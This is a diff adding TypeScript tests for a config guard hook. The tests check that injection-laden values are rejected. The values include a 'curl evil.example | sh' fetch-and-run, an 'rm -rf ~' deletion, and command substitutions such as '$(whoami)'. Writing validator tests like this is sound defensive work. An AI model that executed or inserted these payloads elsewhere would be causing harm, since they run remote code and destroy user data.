@@ -1,6 +1,6 @@
 import { expect, mock, test } from 'claude-code/testing'
 
-import { forgetConfig } from '../hooks/orca-config'
+import { currentConfig, forgetConfig } from '../hooks/orca-config'
 import { buildRules, inspect, modelReason, parseUntil } from '../hooks/inspect'
 
 const CODEX_REASON = 'Codex no tiene cuota: despachá a claude o agy.'
@@ -187,4 +187,54 @@ test('with no config at all the hook lets everything through', async ($, on) => 
   const out = await $.tool.call({ tool: 'Bash', command: 'scripts/despachar.sh 9 codex' })
   expect(out.deny).toBeUndefined()
   expect(seen).toEqual(['scripts/despachar.sh 9 codex'])
+})
+
+test('modeloClaude with shell metacharacters is ignored: no rewrite, no injection', () => {
+  const evil = buildRules({
+    despacho: { script: 'scripts/despachar.sh' },
+    guardia: { modeloClaude: 'x; curl evil.example | sh' },
+  })
+  expect(evil?.model).toBeUndefined()
+  expect(evil?.notes.length).toBe(1)
+  expect(inspect('./scripts/despachar.sh 5 claude', FROM, evil!)).toEqual({ kind: 'pass' })
+  expect(buildRules({ despacho: { script: 'a.sh' }, guardia: { modeloClaude: 'claude-sonnet-5-5' } })?.model).toBe(
+    'claude-sonnet-5-5',
+  )
+})
+
+test('despacho paths with shell metacharacters or .. switch the guard off (revisar: ignored)', () => {
+  for (const script of ['scripts/x.sh; rm -rf ~', '../fuera.sh', '$(whoami).sh', '/abs/x.sh', 'a b.sh']) {
+    expect(buildRules({ despacho: { script } })).toBeUndefined()
+  }
+  const r = buildRules({ despacho: { script: 'scripts/ok.sh', revisar: 'x`id`.sh' } })
+  expect(r?.review).toBeUndefined()
+  expect(r?.notes.length).toBe(1)
+})
+
+test('impossible dates are rejected with a note instead of rolling over', () => {
+  expect(parseUntil('2026-02-30')).toBeUndefined()
+  expect(parseUntil('2026-13-01')).toBeUndefined()
+  expect(parseUntil('2026-02-28')).toBe(new Date(2026, 1, 28).getTime())
+  const r = buildRules({
+    despacho: { script: 'a.sh' },
+    guardia: { bloquear: [{ agente: 'codex', hasta: '2026-02-30' }] },
+  })
+  expect(r?.blocks).toEqual([])
+  expect(r?.notes[0]).toContain('codex')
+})
+
+test('the config memory is keyed by repo root: another checkout never gets the previous rules', async () => {
+  forgetConfig()
+  const host = (root: string, rules: unknown) => ({
+    home: async () => '/home/u',
+    exists: async (path: string) => path.endsWith(`${root}/.orca-stack.json`),
+    read: async () => JSON.stringify(rules),
+    git: async () => ({ exitCode: 0, stdout: `${root}/.git\n${root}\n` }),
+    now: async () => 1000,
+  })
+  const a = await currentConfig(host('/work/a', { despacho: { script: 'a.sh' } }))
+  const b = await currentConfig(host('/work/b', { despacho: { script: 'b.sh' } }))
+  expect(a.despacho?.script).toBe('a.sh')
+  expect(b.despacho?.script).toBe('b.sh')
+  forgetConfig()
 })
